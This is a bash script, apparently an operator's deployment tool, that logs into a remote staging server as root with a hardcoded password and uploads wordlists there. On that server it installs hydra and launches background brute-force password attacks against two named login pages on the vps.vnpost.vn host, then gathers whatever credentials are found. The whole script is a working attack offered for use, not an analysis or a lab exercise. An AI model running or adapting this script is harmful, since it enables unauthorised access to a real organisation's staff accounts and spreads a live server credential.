#!/bin/bash
# Chamcong + VCKV 双线并行爆破

echo "🚀 准备双系统并行攻击..."

# 上传资源
sshpass -p '@admin1314@' scp -o StrictHostKeyChecking=no -P 2233 \
    chamcong_users.txt \
    ../../vckv_attack/vckv_wordlist.txt \
    root@82.29.71.156:/root/vnpost_attack/

# 生成C2攻击脚本
sshpass -p '@admin1314@' ssh -o StrictHostKeyChecking=no -p 2233 root@82.29.71.156 << 'REMOTESCRIPT'
cd /root/vnpost_attack/

# 确保hydra已安装
which hydra || (apt update && apt install -y hydra)

cat > dual_attack.sh << 'ATTACKSCRIPT'
#!/bin/bash

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 双系统并行爆破开始"
echo "时间: $(date)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Chamcong攻击 (线程1)
(
echo "[Chamcong] 开始攻击..."
hydra -L chamcong_users.txt -P vckv_wordlist.txt \
    -s 80 vps.vnpost.vn \
    http-post-form "/chamcong/Login.aspx:tUser=^USER^&tPass=^PASS^:F=login" \
    -t 20 -w 30 -o chamcong_results.txt \
    >> chamcong_attack.log 2>&1
) &

# VCKV攻击 (线程2)
(
echo "[VCKV] 开始攻击..."
cat > vckv_users.txt << 'VCKVUSERS'
nvdh
vckvdbb
admin
VCKVUSERS

hydra -L vckv_users.txt -P vckv_wordlist.txt \
    -s 80 vps.vnpost.vn \
    http-post-form "/vckv/Login.aspx:ctl00\$MainContent\$txtUser=^USER^&ctl00\$MainContent\$txtPassword=^PASS^:F=login_box" \
    -t 20 -w 30 -o vckv_results.txt \
    >> vckv_attack.log 2>&1
) &

wait

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "双系统攻击完成: $(date)"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 汇总结果
echo "=== Chamcong结果 ===" >> attack_summary.txt
cat chamcong_results.txt >> attack_summary.txt 2>/dev/null
echo "=== VCKV结果 ===" >> attack_summary.txt
cat vckv_results.txt >> attack_summary.txt 2>/dev/null

cat attack_summary.txt
ATTACKSCRIPT

chmod +x dual_attack.sh

# 后台启动
nohup bash dual_attack.sh > dual_attack_output.log 2>&1 &

echo "✅ 双系统攻击已启动"
echo "进程ID: $(pgrep -f dual_attack.sh)"
echo ""
echo "监控命令:"
echo "  tail -f /root/vnpost_attack/chamcong_attack.log"
echo "  tail -f /root/vnpost_attack/vckv_attack.log"
REMOTESCRIPT

echo "✅ 部署完成"
